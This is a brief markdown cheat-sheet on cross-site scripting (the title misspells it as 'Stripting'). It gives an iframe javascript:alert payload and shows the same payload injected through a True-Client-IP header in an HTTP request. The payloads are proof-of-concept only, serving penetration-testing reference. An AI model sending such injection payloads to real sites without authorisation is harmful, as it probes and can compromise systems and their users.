# Cross-Site Stripting (XSS)

### Some snippets

```html
<iframe src="javascript:alert(`xss`)">
```


### HTTP-Header XSS

```
GET /some/path HTTP/1.1
Host: 192.168.1.2
...
True-Client-IP: <iframe src="javascript:alert(`xss`)">
...
Connection: close
```